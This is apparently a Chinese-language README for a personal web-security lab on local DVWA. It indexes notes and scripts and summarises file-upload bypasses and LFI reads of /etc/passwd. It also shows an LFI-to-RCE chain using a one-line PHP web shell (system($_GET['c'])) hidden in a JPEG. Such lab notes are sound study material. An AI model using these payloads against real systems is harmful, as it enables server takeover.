# websec-lab-notes

Web 安全靶场学习笔记与实操记录。

自建环境（Docker + DVWA + Kali Linux），从零开始逐个打穿漏洞模块，记录**原理、利用过程、失败原因**，而不只是命令。

---

## 目录

```
01-notes/       学习笔记（原理为主）
02-commands/    实操命令手册（可照敲）
03-reviews/     阶段性复盘与 writeup
04-scripts/     自制工具脚本
```

---

## 01-notes 学习笔记

| 文件 | 内容 |
|---|---|
| [01-web-upload-7-layers.md](01-notes/01-web-upload-7-layers.md) | 文件上传的七层检测，每层怎么绕过 |
| [02-upload-glossary.md](01-notes/02-upload-glossary.md) | 上传相关术语逐个解析 |
| [03-web-terms-digest.md](01-notes/03-web-terms-digest.md) | Web 安全名词速查 |
| [04-http-apache-linux-basics.md](01-notes/04-http-apache-linux-basics.md) | HTTP、Apache 配置、正则基础 |
| [05-why-upload-is-dangerous.md](01-notes/05-why-upload-is-dangerous.md) | 上传漏洞对应哪些真实业务功能 |
| [06-upload-execution-chain.md](01-notes/06-upload-execution-chain.md) | 从浏览器到 PHP 执行的完整链路 |
| [07-bytes-magic-number-encoding.md](01-notes/07-bytes-magic-number-encoding.md) | 字节、十六进制、文件魔数、图片格式结构 |
| [08-image-polyglot-and-lfi.md](01-notes/08-image-polyglot-and-lfi.md) | 图片马原理、`getimagesize` 的盲区、文件包含 |
| [09-lfi-to-rce.md](01-notes/09-lfi-to-rce.md) | LFI 转 RCE 的六条路径 |
| [10-cookie-session-jwt.md](01-notes/10-cookie-session-jwt.md) | Cookie / Session / JWT 的完整机制 |
| [11-bash-basics.md](01-notes/11-bash-basics.md) | bash 命令与选项逐个拆解 |

## 02-commands 命令手册

| 文件 | 内容 |
|---|---|
| [1120-upload-night-commands.md](02-commands/1120-upload-night-commands.md) | 文件上传模块复盘命令 |
| [1122-lfi-night-commands.md](02-commands/1122-lfi-night-commands.md) | 文件包含模块实操命令 |

## 03-reviews 复盘

| 文件 | 内容 |
|---|---|
| [01-auth-bypass-writeup.md](03-reviews/01-auth-bypass-writeup.md) | 认证绕过完整 writeup |
| [02-auth-deep-dive.md](03-reviews/02-auth-deep-dive.md) | 认证机制深入分析 |
| [03-auth-study-pack.md](03-reviews/03-auth-study-pack.md) | 认证学习材料 |
| [04-auth-review.md](03-reviews/04-auth-review.md) | 认证模块复盘 |
| [05-upload-review.md](03-reviews/05-upload-review.md) | 上传模块复盘 |

## 04-scripts 自制脚本

| 文件 | 用途 |
|---|---|
| [01-auth-bypass-exploit.py](04-scripts/01-auth-bypass-exploit.py) | 认证绕过自动化 |
| [02-cookie-forge.py](04-scripts/02-cookie-forge.py) | Cookie 伪造 |
| [03-flask-cookie-server.py](04-scripts/03-flask-cookie-server.py) | 本地验证用 Flask 服务 |
| [04-blind-sqli.py](04-scripts/04-blind-sqli.py) | 布尔盲注与时间盲注脚本 |

---

## 环境

- **攻击机**：Kali Linux（VMware）
- **靶场**：DVWA（`digininja/dvwa` + MariaDB，Docker Compose）
- **端口**：`127.0.0.1:4280` → 容器 80
- **辅助**：sqli-labs、本地 Flask 靶场

---

## 已打通的模块

### 文件上传（File Upload）

| 难度 | 检查 | 绕过方式 |
|---|---|---|
| Low | 无 | 直接传 `.php` |
| Medium | 后缀黑名单 + MIME | `.phtml` / 伪造 `Content-Type` |
| High | 后缀白名单 + MIME + `getimagesize` | 真图片马（真 JPEG + 尾部 PHP） |

**关键结论**：`getimagesize` 只解析文件头部，读到 SOF0 段拿到尺寸就返回，尾部附加的代码它看不见。但假图头（只有魔数没有完整结构）会因为段长度字段对不上而解析失败——**假图头骗得过 `file`，骗不过 `getimagesize`**。

### 文件包含（File Inclusion）

| 难度 | 防御 | 绕过 |
|---|---|---|
| Low | 无 | `?page=/etc/passwd` |
| High | `fnmatch("file*")` 前缀白名单 | `?page=file:///etc/passwd`（`file://` 也以 `file` 开头） |

**关键结论**：`fnmatch` 检查的是"开头像不像"，不是"实际指向哪里"。正确的白名单应该是精确匹配 + `realpath` 校验。

### LFI → RCE

最终链路：**上传图片马 → 通过 LFI 包含它 → 命令执行**。

全程未修改任何服务器配置：

```
上传 cmd.jpg（真 JPEG + <?php system($_GET['c']); ?>）
  ↓
?page=/var/www/html/hackable/uploads/cmd.jpg&c=id
  ↓
uid=33(www-data) gid=33(www-data)
```

---

## 记录原则

每篇笔记都包含三样东西：

1. **原理** —— 为什么会这样，底层发生了什么
2. **过程** —— 完整的操作和输出
3. **失败记录** —— 错误尝试和错误原因（这部分往往比成功更有价值）

---

## 说明

所有实验均在本机 Docker 搭建的靶场中进行，不涉及任何真实系统。
